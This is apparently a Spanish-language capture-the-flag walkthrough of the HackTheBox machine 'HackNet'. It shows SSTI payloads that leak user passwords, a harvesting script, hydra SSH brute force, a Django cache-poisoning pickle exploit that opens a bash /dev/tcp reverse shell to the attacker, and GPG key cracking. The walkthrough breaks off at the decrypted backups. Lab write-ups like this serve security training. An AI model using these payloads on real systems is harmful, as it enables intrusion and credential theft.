---
icon: flag
---

# HackNet HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 05:00 EDT
Nmap scan report for 10.10.11.85
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```

Veremos que hay varios puertos interesantes, entre ellos el puerto `80` que vemos que esta redirigiendo a un `dominio` llamado `hacknet.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              hacknet.htb
```

Lo guardamos y entramos a la pagina:

```
URL = http://hacknet.htb/
```

Dentro veremos unas opciones de crearnos una cuenta o iniciar sesion, como no tenemos cuenta vamos a crearnos una, una vez echo eso nos iremos al `login` e iniciaremos sesion con las credenciales creadas, entrando dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 110412.png" alt=""><figcaption></figcaption></figure>

Veremos un perfil de nuestro usuario nada mas entrar, si nos vamos a `Explore` veremos una seccion de varios usuarios en los que le podemos dar `like` o comentarlos, si nosotros abrimos `BurpSuite` y vamos interceptando las peticiones de todo lo que hacemos veremos que a la hora de dar `like` es bastante interesante lo que vemos y como responde el servidor.

Estando a la escucha con `BurpSuite` le daremos `like` a un comentario y veremos la siguiente peticion:

```
GET /like/10 HTTP/1.1
Host: hacknet.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://hacknet.htb/explore
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: csrftoken=Gb5sfC4RCUOUNPun3YNOpIcHPmVTZBzY; sessionid=0m72xro74306lt0asdeod6jhe6m93nyk
Priority: u=0


```

Vemos que aparece el numero de `likes` en este caso `10` que se han dado mas el que estoy dando yo, si lo cambio a `20` por ejemplo me responde esto el servidor:

```
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sun, 05 Oct 2025 09:09:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7
Connection: keep-alive
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

Success
```

Parece que no ha fallado nada, que se lo ha tragado, pero si volvemos a la pagina veremos que no se ha incrementado como el valor que hemos puesto, pero es interesante saberlo.

Algo importante que tambien vemos es que esta utilizando `Django` gracias a `Wappalizer`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 111603.png" alt=""><figcaption></figcaption></figure>

Si probamos este otro `endpoint` (`likes`):

```
GET /likes/9 HTTP/1.1
Host: hacknet.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://hacknet.htb/explore
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: csrftoken=Gb5sfC4RCUOUNPun3YNOpIcHPmVTZBzY; sessionid=0m72xro74306lt0asdeod6jhe6m93nyk
Priority: u=0


```

No responde el servidor:

```
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sun, 05 Oct 2025 09:23:24 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 641

<div class="likes-review-item"><a href="/profile/4"><img src="/media/4.jpg" title="zero_day"></a></div><div class="likes-review-item"><a href="/profile/12"><img src="/media/12.png" title="codebreaker"></a></div><div class="likes-review-item"><a href="/profile/17"><img src="/media/17.jpg" title="trojanhorse"></a></div><div class="likes-review-item"><a href="/profile/20"><img src="/media/20.jpg" title="stealth_hawk"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/23"><img src="/media/23.jpg" title="virus_viper"></a></div>
```

Vemos que nos responde con las imagenes de los usuarios que le han dado like a la publicacion (Tiene que ser un numero que exista de `likes`), tambien vemos que esta mostrando el `ID` del usuario, la `ID` de la imagen de perfil y por ultimo en el `title` muestra el nombre de usuario.

Aqui lo que se nos ocurre es que como esta utilizando `Django` podremos probar inyeccion de `SSTI` en el nombre de usuario nuestro, para que cuando enviemos un `like` se quede registrado y que cuando nosotros desde el parametro `likes` nos muestre la informacion, muestre tambien el renderizado de la informacion inyectada del nombre de usuario.

Vamos a irnos a nuestro perfil, editarlo y poner algo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 113520.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 113531.png" alt=""><figcaption></figcaption></figure>

Ahora si nos vamos a `Explore`, le damos `like` a una publicacion, se incrementara dicho numero, pues con ese numero sabiendo que existe y que esta incrementado, vamos a utilizar el `likes` de la peticion con `BurpSuite` para enviarla donde le hemos dado `like`.

```
GET /likes/10 HTTP/1.1
Host: hacknet.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://hacknet.htb/explore
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: csrftoken=Gb5sfC4RCUOUNPun3YNOpIcHPmVTZBzY; sessionid=0m72xro74306lt0asdeod6jhe6m93nyk
Priority: u=0


```

En la respuesta veremos...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 113421.png" alt=""><figcaption></figcaption></figure>

Veremos que esta funcionando, esta renderizando el `email` de un usuario, por lo que la inyeccion esta funcionando, ahora vamos a probar con otra cosa como este `payload`.

```
{{ users.0.password }}
```

Quedando nuestro nombre de usuario como ese anterior `payload`, ahora si volvemos a enviar la peticion de `likes` para que lo renderice, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 113950.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado tambien, por lo que tendremos estas credenciales:

```
email: hexhunter@ciphermail.com
pass: H3xHunt3r!
```

Si las probamos en el `login`...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-05 114054.png" alt=""><figcaption></figcaption></figure>

Vemos que seremos dicho usuario, pero no habra nada interesante, por lo que vamos a realizar un `barrido` de `IDs` para ver que credenciales sacamos gracias a esta vulnerabilidad.

## Escalate user mikey

Para no tener que estar dandole `like` uno por uno y despues enviar la segunda peticion para comprobarlo, vamos a montarnos un script que haga todo esto de forma automatica.

> fuzzIDs.py

```python
#!/usr/bin/env python3
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_for_profile_37(target, csrf_token, session_id, max_id=100):
    """
    Escanea endpoints /like/{id} y /likes/{id} del 0 al 100
    y filtra SOLO el perfil con ID 37
    """
    
    headers = {
        'Host': 'hacknet.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'http://hacknet.htb/explore',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Cookie': f'csrftoken={csrf_token}; sessionid={session_id}',
        'Priority': 'u=0'
    }
    
    found_instances = []
    
    def check_like_endpoint(likes_id):
        """Verifica endpoint /like/{id} para perfil 37"""
        try:
            url = f"{target}/like/{likes_id}"
            response = requests.get(url, headers=headers, timeout=5, verify=False)
            
            if response.status_code == 200:
                # Buscar específicamente el perfil 37
                if '/profile/37' in response.text:
                    # Extraer el título del perfil 37
                    match = re.search(
                        r'<div class="likes-review-item"><a href="/profile/37"><img src="[^"]+" title="([^"]+)"></a></div>',
                        response.text
                    )
                    if match:
                        title = match.group(1)
                        found_instances.append(f"Endpoint /like/{likes_id} -> /profile/37 - title=\"{title}\"")
                        print(f"[+] ENCONTRADO: /like/{likes_id} -> /profile/37 - title=\"{title}\"")
                        
        except Exception as e:
            print(f"[-] Error en /like/{likes_id}: {e}")
    
    def check_likes_endpoint(likes_id):
        """Verifica endpoint /likes/{id} para perfil 37"""
        try:
            url = f"{target}/likes/{likes_id}"
            response = requests.get(url, headers=headers, timeout=5, verify=False)
            
            if response.status_code == 200:
                # Buscar específicamente el perfil 37
                if '/profile/37' in response.text:
                    # Extraer el título del perfil 37
                    match = re.search(
                        r'<div class="likes-review-item"><a href="/profile/37"><img src="[^"]+" title="([^"]+)"></a></div>',
                        response.text
                    )
                    if match:
                        title = match.group(1)
                        found_instances.append(f"Endpoint /likes/{likes_id} -> /profile/37 - title=\"{title}\"")
                        print(f"[+] ENCONTRADO: /likes/{likes_id} -> /profile/37 - title=\"{title}\"")
                        
        except Exception as e:
            print(f"[-] Error en /likes/{likes_id}: {e}")
    
    print("[*] Escaneando endpoints /like/{id} (0-100) para perfil 37...")
    
    # Escanear endpoints /like/{id} del 0 al 100
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_like_endpoint, i) for i in range(max_id + 1)]
        
        for future in as_completed(futures):
            future.result()
    
    print(f"\n[*] Escaneando endpoints /likes/{id} (0-100) para perfil 37...")
    
    # Escanear endpoints /likes/{id} del 0 al 100
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_likes_endpoint, i) for i in range(max_id + 1)]
        
        for future in as_completed(futures):
            future.result()
    
    # Mostrar resultados
    print(f"\n{'='*60}")
    print("RESULTADOS - PERFIL 37 ENCONTRADO EN:")
    print('='*60)
    
    if found_instances:
        for instance in sorted(found_instances):
            print(instance)
    else:
        print("❌ No se encontró el perfil 37 en ningún endpoint")
    
    return found_instances

def quick_scan_profile_37(target, csrf_token, session_id):
    """
    Versión rápida que solo busca el perfil 37
    """
    headers = {
        'Host': 'hacknet.htb',
        'Cookie': f'csrftoken={csrf_token}; sessionid={session_id}',
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    print("[*] Búsqueda rápida del perfil 37 en endpoints /likes/...")
    
    for i in range(101):  # 0 to 100
        try:
            response = requests.get(f"{target}/likes/{i}", headers=headers, timeout=3, verify=False)
            
            if response.status_code == 200 and '/profile/<ID_USER>' in response.text:
                # Extraer el título específico del perfil 37
                match = re.search(
                    r'<div class="likes-review-item"><a href="/profile/37"><img src="[^"]+" title="([^"]+)"></a></div>',
                    response.text
                )
                if match:
                    title = match.group(1)
                    print(f"✅ ENCONTRADO: /likes/{i} -> /profile/37 - title=\"{title}\"")
                    
        except Exception as e:
            print(f"[-] Error en /likes/{i}: {e}")

if __name__ == "__main__":
    target = "http://hacknet.htb"
    csrf_token = "<CSRF_TOKEN>"
    session_id = "<SESSION_ID>"
    
    print("🔍 Buscador específico del perfil /profile/37")
    print("=" * 50)
    
    # Opción 1: Escaneo completo (ambos endpoints)
    results = scan_for_profile_37(target, csrf_token, session_id, max_id=100)
    
    print(f"\n{'='*50}")
    print("BÚSQUEDA RÁPIDA ADICIONAL:")
    print('='*50)
    
    # Opción 2: Búsqueda rápida adicional
    quick_scan_profile_37(target, csrf_token, session_id)
    
    print(f"\n🎯 Búsqueda completada. Total de apariciones del perfil 37: {len(results)}")
```

Vamos a probar primero con el primer `payload` de nombre de usuario.

> payload (username)

```
{{ users.0.username }}
```

Ahora ejecutamos la herramienta asi:

```shell
python3 fuzzIDs.py
```

Info:

```
🔍 Buscador específico del perfil /profile/37
==================================================
[*] Escaneando endpoints /like/{id} (0-100) para perfil 37...

[*] Escaneando endpoints /likes/<built-in function id> (0-100) para perfil 37...
[+] ENCONTRADO: /likes/1 -> /profile/37 - title="zero_day"
[+] ENCONTRADO: /likes/2 -> /profile/37 - title="hexhunter"
[+] ENCONTRADO: /likes/8 -> /profile/37 - title="bytebandit"
[+] ENCONTRADO: /likes/12 -> /profile/37 - title="codebreaker"
[+] ENCONTRADO: /likes/18 -> /profile/37 - title="trojanhorse"
[+] ENCONTRADO: /likes/17 -> /profile/37 - title="trojanhorse"
[+] ENCONTRADO: /likes/19 -> /profile/37 - title="{{ users.values }}"
[+] ENCONTRADO: /likes/23 -> /profile/37 - title="backdoor_bandit"

============================================================
RESULTADOS - PERFIL 37 ENCONTRADO EN:
============================================================
Endpoint /likes/1 -> /profile/37 - title="zero_day"
Endpoint /likes/12 -> /profile/37 - title="codebreaker"
Endpoint /likes/17 -> /profile/37 - title="trojanhorse"
Endpoint /likes/18 -> /profile/37 - title="trojanhorse"
Endpoint /likes/19 -> /profile/37 - title="{{ users.values }}"
Endpoint /likes/2 -> /profile/37 - title="hexhunter"
Endpoint /likes/23 -> /profile/37 - title="backdoor_bandit"
Endpoint /likes/8 -> /profile/37 - title="bytebandit"

==================================================
BÚSQUEDA RÁPIDA ADICIONAL:
==================================================
[*] Búsqueda rápida del perfil 37 en endpoints /likes/...
✅ ENCONTRADO: /likes/1 -> /profile/37 - title="zero_day"
✅ ENCONTRADO: /likes/2 -> /profile/37 - title="hexhunter"
✅ ENCONTRADO: /likes/8 -> /profile/37 - title="bytebandit"
✅ ENCONTRADO: /likes/12 -> /profile/37 - title="codebreaker"
✅ ENCONTRADO: /likes/17 -> /profile/37 - title="trojanhorse"
✅ ENCONTRADO: /likes/18 -> /profile/37 - title="trojanhorse"
✅ ENCONTRADO: /likes/19 -> /profile/37 - title="{{ users.values }}"
✅ ENCONTRADO: /likes/23 -> /profile/37 - title="backdoor_bandit"

🎯 Búsqueda completada. Total de apariciones del perfil 37: 8
```

Veremos varios usuarios que hemos podido filtrar, ahora vamos a probar con este `payload` y lo volveremos a ejecutar:

> payload (email)

```
{{ users.0.email }}
```

```shell
python3 fuzzIDs.py
```

Info:

```
🔍 Buscador específico del perfil /profile/37
==================================================
[*] Escaneando endpoints /like/{id} (0-100) para perfil 37...

[*] Escaneando endpoints /likes/<built-in function id> (0-100) para perfil 37...
[+] ENCONTRADO: /likes/2 -> /profile/37 - title="hexhunter@ciphermail.com"
[+] ENCONTRADO: /likes/1 -> /profile/37 - title="zero_day@hushmail.com"
[+] ENCONTRADO: /likes/8 -> /profile/37 - title="bytebandit@exploitmail.net"
[+] ENCONTRADO: /likes/12 -> /profile/37 - title="codebreaker@ciphermail.com"
[+] ENCONTRADO: /likes/18 -> /profile/37 - title="trojanhorse@securemail.org"
[+] ENCONTRADO: /likes/17 -> /profile/37 - title="trojanhorse@securemail.org"
[+] ENCONTRADO: /likes/19 -> /profile/37 - title="aze@aze.fr"
[+] ENCONTRADO: /likes/23 -> /profile/37 - title="mikey@hacknet.htb"

============================================================
RESULTADOS - PERFIL 37 ENCONTRADO EN:
============================================================
Endpoint /likes/1 -> /profile/37 - title="zero_day@hushmail.com"
Endpoint /likes/12 -> /profile/37 - title="codebreaker@ciphermail.com"
Endpoint /likes/17 -> /profile/37 - title="trojanhorse@securemail.org"
Endpoint /likes/18 -> /profile/37 - title="trojanhorse@securemail.org"
Endpoint /likes/19 -> /profile/37 - title="aze@aze.fr"
Endpoint /likes/2 -> /profile/37 - title="hexhunter@ciphermail.com"
Endpoint /likes/23 -> /profile/37 - title="mikey@hacknet.htb"
Endpoint /likes/8 -> /profile/37 - title="bytebandit@exploitmail.net"

==================================================
BÚSQUEDA RÁPIDA ADICIONAL:
==================================================
[*] Búsqueda rápida del perfil 37 en endpoints /likes/...
✅ ENCONTRADO: /likes/1 -> /profile/37 - title="zero_day@hushmail.com"
✅ ENCONTRADO: /likes/2 -> /profile/37 - title="hexhunter@ciphermail.com"
✅ ENCONTRADO: /likes/8 -> /profile/37 - title="bytebandit@exploitmail.net"
✅ ENCONTRADO: /likes/12 -> /profile/37 - title="codebreaker@ciphermail.com"
✅ ENCONTRADO: /likes/17 -> /profile/37 - title="trojanhorse@securemail.org"
✅ ENCONTRADO: /likes/18 -> /profile/37 - title="trojanhorse@securemail.org"
✅ ENCONTRADO: /likes/19 -> /profile/37 - title="aze@aze.fr"
✅ ENCONTRADO: /likes/23 -> /profile/37 - title="mikey@hacknet.htb"

🎯 Búsqueda completada. Total de apariciones del perfil 37: 8
```

Vemos varios `correos` filtrados, ahora por ultimo vamos a intentar filtrar las contraseñas con este ultimo `payload`.

> payload (password)

```
{{ users.0.password }}
```

```shell
python3 fuzzIDs.py
```

Info:

```
🔍 Buscador específico del perfil /profile/37
==================================================
[*] Escaneando endpoints /like/{id} (0-100) para perfil 37...

[*] Escaneando endpoints /likes/<built-in function id> (0-100) para perfil 37...
[+] ENCONTRADO: /likes/1 -> /profile/37 - title="Zer0D@yH@ck"
[+] ENCONTRADO: /likes/2 -> /profile/37 - title="H3xHunt3r!"
[+] ENCONTRADO: /likes/8 -> /profile/37 - title="Byt3B@nd!t123"
[+] ENCONTRADO: /likes/12 -> /profile/37 - title="C0d3Br3@k!"
[+] ENCONTRADO: /likes/17 -> /profile/37 - title="Tr0j@nH0rse!"
[+] ENCONTRADO: /likes/18 -> /profile/37 - title="Tr0j@nH0rse!"
[+] ENCONTRADO: /likes/19 -> /profile/37 - title="aze"
[+] ENCONTRADO: /likes/23 -> /profile/37 - title="mYd4rks1dEisH3re"

============================================================
RESULTADOS - PERFIL 37 ENCONTRADO EN:
============================================================
Endpoint /likes/1 -> /profile/37 - title="Zer0D@yH@ck"
Endpoint /likes/12 -> /profile/37 - title="C0d3Br3@k!"
Endpoint /likes/17 -> /profile/37 - title="Tr0j@nH0rse!"
Endpoint /likes/18 -> /profile/37 - title="Tr0j@nH0rse!"
Endpoint /likes/19 -> /profile/37 - title="aze"
Endpoint /likes/2 -> /profile/37 - title="H3xHunt3r!"
Endpoint /likes/23 -> /profile/37 - title="mYd4rks1dEisH3re"
Endpoint /likes/8 -> /profile/37 - title="Byt3B@nd!t123"

==================================================
BÚSQUEDA RÁPIDA ADICIONAL:
==================================================
[*] Búsqueda rápida del perfil 37 en endpoints /likes/...
✅ ENCONTRADO: /likes/1 -> /profile/37 - title="Zer0D@yH@ck"
✅ ENCONTRADO: /likes/2 -> /profile/37 - title="H3xHunt3r!"
✅ ENCONTRADO: /likes/8 -> /profile/37 - title="Byt3B@nd!t123"
✅ ENCONTRADO: /likes/12 -> /profile/37 - title="C0d3Br3@k!"
✅ ENCONTRADO: /likes/17 -> /profile/37 - title="Tr0j@nH0rse!"
✅ ENCONTRADO: /likes/18 -> /profile/37 - title="Tr0j@nH0rse!"
✅ ENCONTRADO: /likes/19 -> /profile/37 - title="aze"
✅ ENCONTRADO: /likes/23 -> /profile/37 - title="mYd4rks1dEisH3re"

🎯 Búsqueda completada. Total de apariciones del perfil 37: 8
```

Ya con toda esta informacion vamos a crear un diccionario de usuarios y contraseñas para intentar tirar fuerza bruta por `SSH` con `hydra` a ver si hay suerte.

## Hydra

> users.txt

```
zero_day
hexhunter
bytebandit
codebreaker
trojanhorse
backdoor_bandit
mikey
```

En el listado de usuarios añadi `mikey` ya que es el unico correo que es diferente al del usuario propio.

> pass.txt

```
Zer0D@yH@ck
H3xHunt3r!
Byt3B@nd!t123
C0d3Br3@k!
Tr0j@nH0rse!
aze
mYd4rks1dEisH3re
```

Teniendo los listados vamos a utilizarlos de esta forma:

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-05 06:17:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 49 tasks per 1 server, overall 49 tasks, 49 login tries (l:7/p:7), ~1 try per task
[DATA] attacking ssh://10.10.11.85:22/
[22][ssh] host: 10.10.11.85   login: mikey   password: mYd4rks1dEisH3re
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-05 06:17:28
```

Veremos que ha funcionado, por lo que vamos a entrar por `SSH`.

### SSH

```shell
ssh mikey@<IP>
```

Metemos como contraseña `mYd4rks1dEisH3re`...

```
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 5 06:18:55 2025 from 10.10.14.64
mikey@hacknet:~$ whoami
mikey
```

Vemos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
c472c0478eb5952639c179481edeb022
```

## Escalate user sandy

Vamos a realizar un `find` para ver archivos y directorios del usuario `sandy` que sabemos que existe en el sistema a ver que vemos:

```shell
find / -user sandy -ls 2>/dev/null
```

Info:

```
.....................................<RESTO DE INFO>...............................
130105     72 drwxrwxrwx   2 sandy    www-data    73728 Oct  5 05:55 /var/tmp/django_cache
      117      4 drwx------   7 sandy    sandy        4096 Oct  5 03:30 /home/sandy
```

Veremos muchisima informacion, pero todo sera de `/var/www/` cosa que no nos interesa, pero es curiosa la siguiente ruta encontrada que es `/var/tmp`, si nos vamos ahi veremos lo siguiente:

```
total 84
drwxrwxrwt  4 root  root      4096 Oct  5 00:00 .
drwxr-xr-x 12 root  root      4096 May 31  2024 ..
drwxrwxrwx  2 sandy www-data 73728 Oct  5 05:55 django_cache
drwx------  3 root  root      4096 Oct  3 05:25 systemd-private-6c29a9adb23344fea41301b9308312fc-systemd-logind.service-TFrPtz
```

Vemos un directorio llamado `django_cache` que pertenece a `sandy` pero que es del grupo `www-data`, si entramos dentro del mismo no veremos ningun archivo ni nada, es muy interesante esto.

Sabiendo el nombre de este archivo y tambien sabiendo que hay un `Django` podemos deducir que puede tener una vulnerabilidad llamada `Django FileBasedCache Poisoning` vamos a utilizar un `Pickle Inseguro` (Cuando Django lee el caché, automáticamente **reconstruye los objetos** usando `pickle.loads()`), vamos a explotarla de esta forma:

Vamos a montarnos un script que genere este archivo malicioso que vamos a utilizar y que lo sobreescriba a la vez con los permisos necesarios.

```shell
echo '(bash >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1) &' | base64
```

Info:

```
KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvOTk5OSAwPiYxKSAmCg==
```

> createPickle.py

```python
import pickle  
import base64  
import os  
import time  
  
cache_dir = "/var/tmp/django_cache"  
cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvOTk5OSAwPiYxKSAmCg==|base64 -d|bash"  
  
# ---- Pickle payload ----
  
class RCE:  
    def __reduce__(self):  
        return (os.system, (cmd,),)  
  
payload = pickle.dumps(RCE())  
  
# ---- cache ----
  
for filename in os.listdir(cache_dir):  
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path) 
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload)  # pickle payload        
        print(f"[+] Written payload to {filename}")
```

Establecemos los permisos de ejecuccion:

```shell
chmod +x createPickle.py
```

Ahora tendremos que realizar una peticion para que se `caché` de esta forma:

```shell
curl -H 'Host: hacknet.htb' -H 'Cookie: csrftoken=Gb5sfC4RCUOUNPun3YNOpIcHPmVTZBzY; sessionid=0m72xro74306lt0asdeod6jhe6m93nyk' 'http://hacknet.htb/explore?page=1'
```

Echo esto se deberia de guardar los archivos `djcache` en dicha carpeta:

```shell
ls -la /var/tmp/django_cache/
```

Info:

```
total 84
drwxrwxrwx 2 sandy www-data 73728 Oct  5 08:20 .
drwxrwxrwt 4 root  root      4096 Oct  5 00:00 ..
-rw------- 1 sandy www-data    34 Oct  5 08:20 92edc87e91d6f8579414a59afd91bfb8.djcache
-rw------- 1 sandy www-data  2130 Oct  5 08:20 bcba2a1d7459dd42955800c851927d26.djcache
```

Ahora si tendremos que ejecutar el script, pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Si ejecutamos el script veremos lo siguiente:

```shell
python3 createPickle.py
```

Info:

```
[+] Written payload to bcba2a1d7459dd42955800c851927d26.djcache
[+] Written payload to 92edc87e91d6f8579414a59afd91bfb8.djcache
```

Ahora seguidamente en otra terminal ejecutaremos lo siguiente de nuevo para que cargue el `cache` sobreescrito:

```shell
curl -H 'Host: hacknet.htb' -H 'Cookie: csrftoken=Gb5sfC4RCUOUNPun3YNOpIcHPmVTZBzY; sessionid=0m72xro74306lt0asdeod6jhe6m93nyk' 'http://hacknet.htb/explore?page=1'
```

Nos mostrar la pagina en codigo `HTML`, pero si vamos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 9999 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.11.85] 50150
whoami
sandy
```

Veremos que ha funcionado, por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si nos vamos a la siguiente carpeta:

```shell
ls -la /home/sandy/.gnupg/private-keys-v1.d
```

Info:

```
total 20
drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
drwx------ 4 sandy sandy 4096 Oct  5 07:33 ..
-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```

Veremos estos archivos bastante interesantes, nos vamos a pasar el archivo `armored_key.asc`a nuestra maquina atacante para `crackearlo` de esta forma:

```shell
python3 -m http.server
```

En la maquina atacante:

```shell
wget http://<IP_VICTIM>:8000/armored_key.asc
```

Una vez que nos lo descarguemos vamos a obtener el `hash` de la contraseña y `crackearlo` de esta forma:

```shell
gpg2john armored_key.asc > hash
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:04 DONE (2025-10-05 08:32) 0.2242g/s 95.06p/s 95.06c/s 95.06C/s gandako..ladybug
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que ahora teniendo esta clave podemos decodificar cualquier archivo que este cifrado con esta clave.

Si nos vamos a la siguiente ruta veremos estos archivos:

```shell
ls -la /var/www/HackNet/backups
```

Info:

```
total 56
drwxr-xr-x 2 sandy sandy     4096 Oct  5 12:30 .
drwxr-xr-x 7 sandy sandy     4096 Feb 10  2025 ..
-rw-r--r-- 1 sandy www-data     0 Oct  5 12:30 backup01.sql
-rw-r--r-- 1 sandy sandy    13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy    13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy    13851 Dec 29  2024 backup03.sql.gpg
```

Vemos que algunos estan cifrados con dicha clave, por lo que vamos a probar a decodificarlos de esta forma:

> Antes tendremos que importarnos la clave:

```shell
gpg --import armored_key.asc
```

Info:

```
gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

Ahora teniendola importada en esta sesion, podremos hacer esto:

```shell
gpg --batch --passphrase-fd 0 -o /tmp/backup01.sql --decrypt backup01.sql.gpg
gpg --batch --passphrase-fd 0 -o /tmp/backup02.sql --decrypt backup02.sql.gpg
gpg --batch --passphrase-fd 0 -o /tmp/backup03.sql --decrypt backup03.sql.gpg
```

Metemos como contraseña `sweetheart` y veremos que funciona, vamos a comprobar el `/tmp` para ver que se decodifico bien:

```
-rw-r--r--  1 sandy www-data 47885 Oct  5 13:32 backup01.sql
-rw-r--r--  1 sandy www-data 48626 Oct  5 13:33 backup02.sql
-rw-r--r--  1 sandy www-data 48859 Oct  5 13:33 backup03.sql
```

Veremos que si, ahora si los leemos veremos lo siguiente:

```
..................................<RESTO DE INFO>..................................
